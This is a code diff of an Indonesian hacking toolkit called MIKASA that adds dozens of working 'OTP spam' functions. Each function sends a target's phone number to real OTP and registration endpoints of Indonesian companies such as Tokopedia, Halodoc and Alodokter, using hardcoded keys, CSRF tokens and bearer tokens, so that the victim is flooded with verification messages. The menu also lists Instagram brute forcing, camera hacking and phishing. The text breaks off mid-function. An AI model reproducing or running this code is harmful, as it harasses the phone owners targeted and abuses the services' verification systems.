@@ -299,7 +299,7 @@ def print_banner(user, date):
 {R}─────────────────────────────────────────────────────────────{N}
 {R}  {W}01{N} OTP SPAM     {W}02{N} HACK-CAMERA  {W}03{N} OSINT{N}
 {R}  {W}04{N} EMAIL SPAM   {W}05{N} DECODER      {W}06{N} ENCRYPTOR{N}
-{R}  {W}07{N} PW CRACKER   {W}08{N} IP TRACKER   {W}09{N} PORT SCAN{N}
+{R}  {W}07{N} IMEI Checker {W}08{N} IP TRACKER   {W}09{N} PORT SCAN{N}
 {R}  {W}10{N} BOT TELEGRAM {W}11{N} IG BRUTE     {W}12{N} SPAM NGL{N}
 {R}  {W}13{N} Phissing     {W}14{N} PROXY CHECK  {W}15{N} FILE ORGAN{N}
 {R}─────────────────────────────────────────────────────────────{N}
@@ -332,111 +332,37 @@ def refresh_date():
         
         time.sleep(1)
 
-# Tambahkan variabel global di awal file (setelah import)
+
 cooldown_otp = 0
 cooldown_lock = threading.Lock()
 stop_cooldown = False
 
-# ===================== FUNGSI OTP SPAM =====================
-def tool_otp_spam():
-    global cooldown_otp, stop_cooldown
-    os.system('clear')
-    
-
-    with cooldown_lock:
-        sisa = cooldown_otp - time.time()
-        if sisa > 0:
-            print(f"{R}─────────────────────────────────────────────────────────────{N}")
-            print(f"""
-{R}╔═╗╔═╦══╦╗╔═╦═══╦═══╦═══╗
-{R}║║╚╝║╠╣╠╣║║╔╣╔═╗║╔═╗║╔═╗║
-{R}║╔╗╔╗║║║║╚╝╝║║─║║╚══╣║─║║
-{R}║║║║║║║║║╔╗║║╚═╝╠══╗║╚═╝║
-{R}║║║║║╠╣╠╣║║╚╣╔═╗║╚═╝║╔═╗║
-{R}╚╝╚╝╚╩══╩╝╚═╩╝─╚╩═══╩╝─╚╝ {N}""")
-            print(f"{R}  Tunggu {Y}{int(sisa)} detik{R} sebelum spam lagi{N}")
-            print(f"{R}─────────────────────────────────────────────────────────────{N}")
-            print()
-            
-            # Timer cooldown
-            stop_cooldown = False
-            for i in range(int(sisa), 0, -1):
-                if stop_cooldown:
-                    break
-                print(f"{Y}[⏳] Sisa {i} detik...{N}", end="\r")
-                time.sleep(1)
-            
-            # Cek apakah user menekan ENTER untuk kembali
-            import sys, select
-            if select.select([sys.stdin], [], [], 0)[0]:
-                cmd = sys.stdin.readline().strip()
-                if cmd == "":
-                    stop_cooldown = True
-
-            if not stop_cooldown:
-                print(f"{G}[✓] Cooldown selesai!{N}")
-                time.sleep(1)
-            # Kembali ke menu utama
-            print(f"{Y}[!] Kembali ke MIKASA...{N}")
-            time.sleep(1)
-            return
-    
-    # Tampilan utama OTP SPAM
-    print(f"""
-{R}─────────────────────────────────────────────────────────────{N}
-{R}  {W}                                     {R}│{N}  {R}  -••••{N}
-{R}  {W}█▀ █▀█ ▄▀█ █▀▄▀█                     {R}│{N}  {R} -••••••{N}
-{R}  {W}▄█ █▀▀ █▀█ █░▀░█                     {R}│{N}  {R}-••  ••••{N}
-{R}  {W}█▀█ ▀█▀ █▀█                          {R}│{N}  {R}-••    ••••{N}
-{R}  {W}█▄█ ░█░ █▀▀                          {R}│{N}  {R}-••••  ••••••{N}
-{R}  {W}                                     {R}│{N}  {R} -••••••••••{N}
-{R}  {W}AUTHOR = Rullzz06{N}                    {R}│{N}  {R}   -••••••{N}
-{R}─────────────────────────────────────────────────────────────{N}  
-{R}  {Y}📌 Contoh Format nomor:{N}
-{R}    {W}08xxxxxxxxxx{N}
-{R}    {W}628xxxxxxxxxx{N}
-{R}    {W}+628xxxxxxxxxx{N}
-{R}─────────────────────────────────────────────────────────────{N}
-{R}  {Y}💡 Masukkan nomor target, atau {R}ENTER {Y}untuk kembali{N}
-{R}─────────────────────────────────────────────────────────────{N}
- """)
-    
-    nomor = input(f"{R}┌──({P}MIKASA{R})-[{C}OTP{R}]\n└─{R}${N} ").strip()
-    
-    if not nomor:
-        print(f"{Y}[!] Kembali ke MIKASA...{N}")
-        time.sleep(1)
-        return
-    
-    # Format nomor
-    if nomor.startswith("0"):
-        nomor = "62" + nomor[1:]
-    elif nomor.startswith("+"):
-        nomor = nomor[1:]
-    elif not nomor.startswith("62"):
-        nomor = "62" + nomor
-    
-    print(f"\n{G}[+] Target: +{nomor}{N}")
-    print(f"{Y}[+] Mengirim OTP...{N}")
-    time.sleep(5)
-    print()
-    
-    # ===== FUNGSI SPAM (SAMA SEPERTI SEBELUMNYA) =====
-    def spam_otp_adiraku(nomor):
-      try:
-        if nomor.startswith("62"):
-            nomor_lokal = "0" + nomor[2:]
-        else:
+def spam_otp_adiraku(nomor):
+     try:
+        if nomor.startswith('62'):
+            nomor_lokal = '0' + nomor[2:]
+        elif nomor.startswith('0'):
             nomor_lokal = nomor
-        url = "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata"
-        headers = {"Content-Type": "application/json; charset=utf-8"}
-        payload = {"mobileNumber": nomor_lokal, "type": "prospect-create", "channel": "whatsapp"}
+        else:
+            nomor_lokal = '0' + nomor
+
+        url = 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata'
+        headers = {
+            'Content-Type': 'application/json; charset=utf-8'
+        }
+        payload = {
+            'mobileNumber': nomor_lokal,
+            'type': 'prospect-create',
+            'channel': 'whatsapp'
+        }
+
         resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return spam_otp_nilai(resp.text, '{"message":"', '","') == "success"
-      except:
+        return resp.status_code < 400
+
+     except Exception as e:
         return False
     
-    def spam_otp_tokopedia(nomor):
+def spam_otp_tokopedia(nomor):
       try:
         session = requests.Session()
         url_token = f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={nomor}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister"
@@ -463,17 +389,33 @@ def tool_otp_spam():
       except:
         return False
     
-    def spam_otp_singa(nomor):
-        try:
-            url = "https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id="
-            payload = {"mobile_phone": nomor, "type": "mobile", "is_switchable": 1}
-            headers = {"Content-Type": "application/json; charset=utf-8"}
-            res = requests.post(url, json=payload, headers=headers, timeout=10)
-            return res.status_code == 200
-        except:
-            return False
+def spam_otp_singa(nomor):
+     try:
+        if nomor.startswith('0'):
+            nomor = '62' + nomor[1:]
+        elif nomor.startswith('+62'):
+            nomor = nomor[1:]
+        elif not nomor.startswith('62'):
+            nomor = '62' + nomor
+
+        url = 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id='
+        headers = {
+            'Content-Type': 'application/json; charset=utf-8',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
+        }
+        payload = {
+            'mobile_phone': nomor,
+            'type': 'mobile',
+            'is_switchable': 1
+        }
+
+        resp = requests.post(url, json=payload, headers=headers, timeout=10)
+        return resp.status_code == 200
+
+     except Exception as e:
+        return False
     
-    def spam_otp_pinhome(nomor):
+def spam_otp_pinhome(nomor):
         try:
             if nomor.startswith("62"):
                 nomor_lokal = "0" + nomor[2:]
@@ -500,7 +442,7 @@ def tool_otp_spam():
         except:
             return False
     
-    def spam_otp_duniagames(nomor):
+def spam_otp_duniagames(nomor):
         try:
             phone = nomor
             if nomor.startswith("0"):
@@ -525,7 +467,7 @@ def tool_otp_spam():
         except:
             return False
     
-    def spam_otp_acc(nomor):
+def spam_otp_acc(nomor):
         try:
             if nomor.startswith("62"):
                 nomor_lokal = "0" + nomor[2:]
@@ -548,8 +490,8 @@ def tool_otp_spam():
             return resp.status_code == 200
         except:
             return False
-    
-    def spam_otp_absenku(nomor):
+   
+def spam_otp_absenku(nomor):
       try:
         if nomor.startswith("62"):
             nomor = "0" + nomor[2:]
@@ -607,7 +549,7 @@ def tool_otp_spam():
       except:
         return False
     
-    def spam_otp_saturdays(nomor):
+def spam_otp_saturdays(nomor):
      try:
         if nomor.startswith("0"):
             nomor_lokal = nomor[1:]
@@ -652,30 +594,38 @@ def tool_otp_spam():
      except:
         return False
     
-    def spam_otp_maulagi(nomor):
-        try:
-            if nomor.startswith("62"):
-                nomor = "0" + nomor[2:]
-            session = requests.Session()
-            headers = {
-                "accept": "application/json, text/plain, */*",
-                "content-type": "application/json",
-                "origin": "https://maulagi.id",
-                "referer": "https://maulagi.id/",
-                "user-agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36",
-                "x-ml-key": "E32VCHXX32"
-            }
-            resp = session.post(
-                "https://api.maulagi.id/api/v2/auth/check",
-                json={"credentials": nomor},
-                headers=headers,
-                timeout=10
-            )
-            return resp.status_code < 400
-        except:
-            return False
-            
-    def spam_otp_bliblitiket(nomor):
+def spam_otp_maulagi(nomor):
+     try:
+        if nomor.startswith("0"):
+            nomor_lokal = nomor[1:]
+        elif nomor.startswith("62"):
+            nomor_lokal = nomor[2:]
+        else:
+            nomor_lokal = nomor
+        
+        session = requests.Session()
+        url = "https://api.maulagi.id/api/v2/auth/check"
+        
+        headers = {
+            'Content-Type': 'application/json',
+            'Origin': 'https://maulagi.id',
+            'x-ml-key': 'C59RUHBU59',
+            'Accept': 'application/json, text/plain, */*',
+            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-mobile': '?1',
+            'Referer': 'https://maulagi.id/',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
+        }
+        
+        payload = {"credentials": nomor_lokal}
+        
+        resp = session.post(url, json=payload, headers=headers, timeout=10)
+        return resp.status_code < 400
+     except:
+        return False
+
+def spam_otp_bliblitiket(nomor):
      try:
         if nomor.startswith("0"):
             nomor = "62" + nomor[1:]  
@@ -721,7 +671,7 @@ def tool_otp_spam():
      except:
         return False       
      
-    def spam_otp_matahari(nomor):
+def spam_otp_matahari(nomor):
       try:
         if nomor.startswith("0"):
             nomor_lokal = nomor[1:]
@@ -774,7 +724,7 @@ def tool_otp_spam():
       except:
         return False
 
-    def spam_otp_rumah123(nomor):
+def spam_otp_rumah123(nomor):
      try:
         if nomor.startswith("0"):
             nomor_lokal = "62" + nomor[1:]
@@ -818,7 +768,7 @@ def tool_otp_spam():
      except:
         return False
        
-    def spam_otp_halodoc(nomor):
+def spam_otp_halodoc(nomor):
      try:
         if nomor.startswith("0"):
             nomor_lokal = "62" + nomor[1:]
@@ -860,7 +810,7 @@ def tool_otp_spam():
      except:
         return False
         
-    def spam_otp_misteraladin(nomor):
+def spam_otp_misteraladin(nomor):
      try:
         if nomor.startswith("0"):
             nomor_lokal = nomor[1:]
@@ -904,85 +854,1138 @@ def tool_otp_spam():
         return resp.status_code < 400
      except:
         return False
-
-    while True:
-
-        apis = {
-            "1": spam_otp_adiraku,
-            "2": spam_otp_tokopedia,
-            "3": spam_otp_singa,
-            "4": spam_otp_pinhome,
-            "5": spam_otp_duniagames,
-            "6": spam_otp_acc,
-            "7": spam_otp_absenku,
-            "8": spam_otp_saturdays,
-            "9": spam_otp_maulagi,
-            "10": spam_otp_bliblitiket,
-            "11": spam_otp_matahari,
-            "12": spam_otp_rumah123,
-            "13": spam_otp_halodoc,
-            "14": spam_otp_misteraladin
+       
+def spam_otp_paper(nomor):
+     try:
+        if nomor.startswith("0"):
+            nomor_lokal = "62" + nomor[1:]
+        elif nomor.startswith("+"):
+            nomor_lokal = nomor[1:]
+        elif nomor.startswith("62"):
+            nomor_lokal = nomor
+        else:
+            nomor_lokal = "62" + nomor
+        
+        session = requests.Session()
+        url = "https://register.paper.id/api/v1/auth/register/send-otp"
+        
+        headers = {
+            'Content-Type': 'application/json',
+            'Origin': 'https://paper.id',
+            'x-paper-user-agent': 'multiverse/2.54.1 mobile_web (android) chrome',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+            'Accept': 'application/json, text/plain, */*',
+            'Referer': 'https://paper.id/'
         }
         
-        hasil = {}
-        with ThreadPoolExecutor(max_workers=len(apis)) as executor:
-            futures = {executor.submit(fungsi, nomor): nama for nama, fungsi in apis.items()}
-            for future in as_completed(futures):
-                nama = futures[future]
-                try:
-                    hasil[nama] = future.result()
-                except:
-                    hasil[nama] = False
+        payload = {
+            "phone": nomor_lokal,
+            "method": "whatsapp",
+            "registered_by": "flutter mweb"
+        }
         
-        berhasil = sum(1 for v in hasil.values() if v)
-        gagal = len(hasil) - berhasil
+        resp = session.post(url, json=payload, headers=headers, timeout=10)
         
-        print(f"{G}─────────────────────────────────────────────────────────────{N}")
-        print(f"{G}  HASIL PENGIRIMAN OTP{N}")
-        print(f"{G}─────────────────────────────────────────────────────────────{N}")
-        print(f"  {W}Total {G}Berhasil {W}: {G}{berhasil}{N}")
-        print(f"  {W}Total {R}Gagal   {W}: {R}{gagal}{N}")
-        print(f"{G}─────────────────────────────────────────────────────────────{N}")
+
+        if resp.status_code == 200:
+            data = resp.json()
+            if data.get("status") == "success" or "otp" in str(data).lower():
+                return True
+            else:
+                return False
+        else:
+            return False
+            
+     except Exception as e:
+        return False
+       
+def spam_otp_planetban(nomor):
+     try:
+
+        if nomor.startswith("62"):
+            nomor_lokal = "0" + nomor[2:]
+        elif nomor.startswith("+"):
+            nomor_lokal = "0" + nomor[3:] if nomor.startswith("+62") else "0" + nomor[1:]
+        elif nomor.startswith("0"):
+            nomor_lokal = nomor
+        else:
+            nomor_lokal = "0" + nomor
         
-        # Set cooldown 60 detik
-        with cooldown_lock:
-            cooldown_otp = time.time() + 60
+        import random
+        import string
+        random_name = f"User{random.randint(100,999)}"
+        random_password = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
         
-        print(f"""{Y} 
+        session = requests.Session()
+        url = "https://api.planetban.com/website/customer/request-otp"
+        
+        headers = {
+            'Content-Type': 'application/json',
+            'Origin': 'https://planetban.com',
+            'Referer': 'https://planetban.com/',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+            'Accept': 'application/json, text/plain, */*'
+        }
+        
+        payload = {
+            "name": random_name,
+            "phone": nomor_lokal,
+            "password": random_password,
+            "purpose": "register",
+            "method": "whatsapp"
+        }
+        
+        resp = session.post(url, json=payload, headers=headers, timeout=10)
+       
+        if resp.status_code == 200:
+            data = resp.json()
+            if data.get("status") == True or data.get("success") == True or "success" in str(data).lower():
+                return True
+            else:
+                return False
+        else:
+            return False
+            
+     except Exception as e:
+        return False
+      
+def spam_otp_bunda(nomor):
+     try:
+        if nomor.startswith("0"):
+            nomor_lokal = "62" + nomor[1:]
+        elif nomor.startswith("+"):
+            nomor_lokal = nomor[1:]
+        elif nomor.startswith("62"):
+            nomor_lokal = nomor
+        else:
+            nomor_lokal = "62" + nomor
+        
+        session = requests.Session()
+        url = "https://cms.bunda.co.id/api/v1/auth/send-otp"
+        
+        headers = {
+            'Content-Type': 'application/json',
+            'Origin': 'https://www.bunda.co.id',
+            'x-locale': 'id',
+            'Referer': 'https://www.bunda.co.id/',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
+        }
+        
+        payload = {
+            "phone_number": int(nomor_lokal),
+            "type": "auth"
+        }
+        
+        resp = session.post(url, json=payload, headers=headers, timeout=10)
+        return resp.status_code < 400
+     except:
+        return False
+       
+def spam_otp_bonusbelanja(nomor):
+     try:
+        if nomor.startswith("0"):
+            nomor_lokal = "62" + nomor[1:]
+        elif nomor.startswith("+"):
+            nomor_lokal = nomor[1:]
+        elif nomor.startswith("62"):
+            nomor_lokal = nomor
+        else:
+            nomor_lokal = "62" + nomor
+        
+        session = requests.Session()
+        url = "https://www.bonusbelanja.com/api/auth/registration/app"
+        
+        headers = {
+            'Content-Type': 'application/json',
+            'Origin': 'https://www.bonusbelanja.com',
+            'Referer': 'https://www.bonusbelanja.com/register/',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
+        }
+        
+        payload = {
+            "phone": nomor_lokal,
+            "name": "User",
+            "agreeTnc": True,
+            "agreeContact": True
+        }
+        
+        resp = session.post(url, json=payload, headers=headers, timeout=10)
+        return resp.status_code < 400
+     except:
+        return False
+       
+def spam_otp_hijup(nomor):
+     try:
+        if nomor.startswith("0"):
+            nomor_lokal = "62" + nomor[1:]
+        elif nomor.startswith("+"):
+            nomor_lokal = nomor[1:]
+        elif nomor.startswith("62"):
+            nomor_lokal = nomor
+        else:
+            nomor_lokal = "62" + nomor
+        
+        session = requests.Session()
+        url = "https://www.hijup.com/sign_in"
+        
+        headers = {
+            'Content-Type': 'text/plain;charset=UTF-8',
+            'Origin': 'https://www.hijup.com',
+            'next-action': 'b7eda6e749fbadcfcf226c2e36865091520b679f',
+            'next-router-state-tree': '%5B%22%22%2C%7B%22children%22%3A%5B%5B%22merchant%22%2C%22hijup%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22sign_in%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
+            'next-url': '/sign_in',
+            'Referer': 'https://www.hijup.com/sign_in',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
+        }
+        
+        payload = f'[{{"phone_number":"{nomor_lokal}","store_path":"hijup"}}]'
+        
+        resp = session.post(url, data=payload, headers=headers, timeout=10)
+        return resp.status_code < 400
+     except:
+        return False
+       
+def spam_otp_alodokter(nomor):
+     try:
+        if nomor.startswith("0"):
+            nomor_lokal = nomor
+        elif nomor.startswith("62"):
+            nomor_lokal = "0" + nomor[2:]
+        else:
+            nomor_lokal = "0" + nomor
+        
+        raw = nomor_lokal[1:] if nomor_lokal.startswith("0") else nomor_lokal
+        
+        import uuid
+        uuid_val = str(uuid.uuid4())
+        
+        session = requests.Session()
+        url = "https://www.alodokter.com/resend-otp"
+        
+        headers = {
+            'Content-Type': 'application/json',
+            'Origin': 'https://www.alodokter.com',
+            'x-csrf-token': 'o/FdMeWMEtf5/jbtImqJr9Wuau4r9I/boJAwEcUQv3x+WGzrnGnjY3WdVSdd9P2FVrx17l4r02I7VLEjCYoPrg==',
+            'Referer': f'https://www.alodokter.com/otp_phone_number?type=register&phone={raw}',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
+        }
+        
+        payload = {
+            "user": {
+                "phone": nomor_lokal,
+                "uuid": uuid_val
+            },
+            "request_via": "whatsapp"
+        }
+        
+        resp = session.post(url, json=payload, headers=headers, timeout=10)
+        return resp.status_code < 400
+     except:
+        return False
+       
+def spam_otp_ohsome(nomor):
+     try:
+        if nomor.startswith("0"):
+            nomor_lokal = nomor[1:]
+        elif nomor.startswith("62"):
+            nomor_lokal = nomor[2:]
+        else:
+            nomor_lokal = nomor
+        
+        session = requests.Session()
+        url = "https://ohsome.co.id/api/member/user/random_code_check"
+        
+        headers = {
+            'Content-Type': 'application/json',
+            'Origin': 'https://ohsome.co.id',
+            'language': 'id',
+            'deviceid': 'ba0a0027a5e6e7cde77f0f94f2572495',
+            'x-store-no': 'SC001',
+            'traceparent': '00-6bd858f4bdf14f53a8d3de8e6741641a-d542ee3bee82f7f4-01',
+            'platform': 'H5',
+            'tracestate': 'rum=v2&browser&j2e0xaqli6@901063bd0372204&df97461d6dea41e59bb8ad0ea28ef184&uid_had63ijdnpxyb93t',
+            'Referer': 'https://ohsome.co.id/login',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
+        }
+        
+        payload = {
+            "country_code": "62",
+            "account": nomor_lokal,
+            "type_id": 2,
+            "device_id": "ba0a0027a5e6e7cde77f0f94f2572495",
+            "check_code": str(random.randint(100000, 999999)),
+            "image_id": "tcsRCTZ0RAvqQAvcUJDG"
+        }
+        
+        resp = session.post(url, json=payload, headers=headers, timeout=10)
+        return resp.status_code < 400
+     except:
+        return False
+       
+def spam_otp_optikmelawai(nomor):
+     try:
+        if nomor.startswith("0"):
+            nomor_lokal = "62" + nomor[1:]
+        elif nomor.startswith("+"):
+            nomor_lokal = nomor[1:]
+        elif nomor.startswith("62"):
+            nomor_lokal = nomor
+        else:
+            nomor_lokal = "62" + nomor
+        
+        session = requests.Session()
+        url = "https://api.optikmelawai.com/api/v3/auth/register/1"
+        
+        headers = {
+            'authorization': 'Bearer a6a84b1f1e604d683fbef2295c2262373eba254197a1e14ab3a1e95a4394e4debf13560e5dbd66ab1e628aa3e73d3667d11f083077e562169b78d2ef2f3d285542a22f5ae174badd1313593deb5ec4389c75de38055b4964969a8323f031d47a6b35b3af4a096a08d6dddc2bf616c36bbeea1602b5b8a041650909107c207ed9',
+            'x-unique-user': 'GA1.1.1062236172.1780823549',
+            'language': 'id',
+            'Origin': 'https://www.optikmelawai.com',
+            'Referer': 'https://www.optikmelawai.com/',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
+        }
+        
+        data = {
+            "phone_number": nomor_lokal,
+            "name": "User",
+            "email": f"user{random.randint(100000,999999)}@gmail.com",
+            "password": "Test123",
+            "password_confirmation": "Test123"
+        }
+        
+        resp = session.post(url, data=data, headers=headers, timeout=10)
+        return resp.status_code < 400
+     except:
+        return False
+       
+def spam_otp_hollandbakery(nomor):
+     try:
+        if nomor.startswith("0"):
+            nomor_lokal = nomor
+        elif nomor.startswith("62"):
+            nomor_lokal = "0" + nomor[2:]
+        else:
+            nomor_lokal = "0" + nomor
+        
+        session = requests.Session()
+        url = "https://www.hollandbakery.co.id/resend-otp-register"
+        
+        headers = {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': 'https://www.hollandbakery.co.id',
+            'Referer': 'https://www.hollandbakery.co.id/users/verify_token',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
+        }
+        
+        data = {
+            "phone": nomor_lokal
+        }
+        
+        resp = session.post(url, data=data, headers=headers, timeout=10)
+        return resp.status_code < 400
+     except:
+        return False
+       
+def spam_otp_hashmicro(nomor):
+     try:
+        if nomor.startswith("0"):
+            nomor_lokal = nomor[1:]
+        elif nomor.startswith("62"):
+            nomor_lokal = nomor[2:]
+        else:
+            nomor_lokal = nomor
+        
+        session = requests.Session()
+        url = "https://website-api.hashmicro.com/api/add/3"
+        
+        headers = {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': 'https://www.hashmicro.com',
+            'Referer': 'https://www.hashmicro.com/',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
+        }
+        
+        data = {
+            "phone_number": nomor_lokal,
+            "name": "User",
+            "email": f"user{random.randint(100000,999999)}@gmail.com"
+        }
+        
+        resp = session.post(url, data=data, headers=headers, timeout=10)
+        return resp.status_code < 400
+     except:
+        return False
+       
+def spam_otp_tuneup(nomor):
+     try:
+        if nomor.startswith("0"):
+            nomor_lokal = nomor[1:]
+        elif nomor.startswith("62"):
+            nomor_lokal = nomor[2:]
+        else:
+            nomor_lokal = nomor
+        
+        session = requests.Session()
+        url = "https://api.tuneup.id/v1/mitra/register/send-otp"
+        
+        headers = {
+            'Content-Type': 'application/json',
+            'Origin': 'https://tuneup.id',
+            'Referer': 'https://tuneup.id/',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
+        }
+        
+        payload = {"phone": nomor_lokal}
+        
+        resp = session.post(url, json=payload, headers=headers, timeout=10)
+        return resp.status_code < 400
+     except:
+        return False
+
+def spam_otp_ultramilk(nomor):
+     try:
+        if nomor.startswith("0"):
+            nomor_lokal = "62" + nomor[1:]
+        elif nomor.startswith("+"):
+            nomor_lokal = nomor[1:]
+        elif nomor.startswith("62"):
+            nomor_lokal = nomor
+        else:
+            nomor_lokal = "62" + nomor
+        
+        session = requests.Session()
+        url = "https://ultramilk-clp.kata.ai/api/ultramilk/register"
+        
+        headers = {
+            'Content-Type': 'application/json',
+            'Origin': 'https://ultramilk-clp.kata.ai',
+            'Referer': 'https://ultramilk-clp.kata.ai/',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
+        }
+        
+        payload = {"phone": nomor_lokal}
+        
+        resp = session.post(url, json=payload, headers=headers, timeout=10)
+        return resp.status_code < 400
+     except:
+        return False
+
+def spam_otp_kaniva(nomor):
+     try:
+        if nomor.startswith("62"):
+            lokal = "0" + nomor[2:]
+        elif nomor.startswith("0"):
+            lokal = nomor
+        else:
+            lokal = "0" + nomor
+        
+        names = ['Fahri', 'Budi', 'Andi', 'Citra', 'Dewi', 'Eko', 'Fajar', 'Gina', 'Hana', 'Irwan', 'Joko']
+        name = random.choice(names)
+        
+        session = requests.Session()
+        url = "https://daftar.kanivainternationalbali.com/register/whatsapp/request-otp"
+        
+        headers = {
+            'Accept': 'text/html, application/xhtml+xml',
+            'Content-Type': 'application/json',
+            'X-Requested-With': 'XMLHttpRequest',
+            'X-Inertia': 'true',
+            'X-Inertia-Version': '56e6482206af61d5490c1118b2876044',
+            'X-XSRF-TOKEN': 'eyJpdiI6InJmTFEzYkVZUHRNY1VXMHlDRTEyY0E9PSIsInZhbHVlIjoicW9maGwwN2JYR1FPNmNTV2RCOTFXZjJ1RVF1eGxJYVFwTVNMR25BMUN6cFh0bkJVeERmamM4VkR5STNRQ1BtRStqallFZDd3Y0hsd1ZFQUdTalFPSXJrWFliNTNiVldoMjRjNWQwcmdRVlNwQ1ZxcWVQdlZ1ajNubkovL0gybTYiLCJtYWMiOiIyOTljYzhmOWZlNjY3NzhjNGUyYzkxYmUyOTA1OGVjMzU3ZDdmZDhjMTk4OTMyNzllMDY2ZTQ0MDVmZWViMzcwIiwidGFnIjoiIn0=',
+            'Referer': 'https://daftar.kanivainternationalbali.com/register',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
+        }
+        
+        payload = {
+            "name": name,
+            "phone": lokal
+        }
+        
+        resp = session.post(url, json=payload, headers=headers, timeout=10)
+        return resp.status_code < 400
+        
+     except Exception as e:
+        return False
+
+def spam_otp_jembatani(nomor):
+     try:
+        if nomor.startswith("0"):
+            nomor_lokal = nomor
+        elif nomor.startswith("62"):
+            nomor_lokal = "0" + nomor[2:]
+        else:
+            nomor_lokal = "0" + nomor
+        
+        import random
+        import string
+        rand_name = 'User' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
+        rand_pass = "Test@" + ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + "#1"
+        
+        session = requests.Session()
+        url = "https://api.jembatani.co.id/v1/register"
+        
+        headers = {
+            'Content-Type': 'application/json',
+            'Origin': 'https://jembatani.co.id',
+            'Referer': 'https://jembatani.co.id/',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
+        }
+        
+        payload = {
+            "phone": nomor_lokal,
+            "name": rand_name,
+            "password": rand_pass
+        }
+        
+        resp = session.post(url, json=payload, headers=headers, timeout=10)
+        return resp.status_code < 400
+     except:
+        return False
+
+def spam_otp_rcx(nomor):
+     try:
+        if nomor.startswith("0"):
+            nomor_lokal = nomor[1:]
+        elif nomor.startswith("62"):
+            nomor_lokal = nomor[2:]
+        else:
+            nomor_lokal = nomor
+        
+        import random
+        import string
+        rand_name = 'User' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
+        rand_email = f'user{random.randint(1000,9999)}@mailnesia.com'
+        
+        session = requests.Session()
+        url = "https://sso.rcx.co.id/auth/passwordless/request"
+        
+        headers = {
+            'Content-Type': 'application/json',
+            'Origin': 'https://sso.rcx.co.id',
+            'Referer': 'https://sso.rcx.co.id/',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
+        }
+        
+        payload = {
+            "phone": nomor_lokal,
+            "name": rand_name,
+            "email": rand_email
+        }
+        
+        resp = session.post(url, json=payload, headers=headers, timeout=10)
+        return resp.status_code < 400
+     except:
+        return False
+
+def spam_otp_sahabatteknisi(nomor):
+     try:
+        if nomor.startswith("0"):
+            nomor_lokal = nomor[1:]
+        elif nomor.startswith("62"):
+            nomor_lokal = nomor[2:]
+        else:
+            nomor_lokal = nomor
+        
+        session = requests.Session()
+        url = "https://www.sahabatteknisi.co.id/api/auth/otp/check-phone"
+        
+        headers = {
+            'Content-Type': 'application/json',
+            'Origin': 'https://www.sahabatteknisi.co.id',
+            'Referer': 'https://www.sahabatteknisi.co.id/',
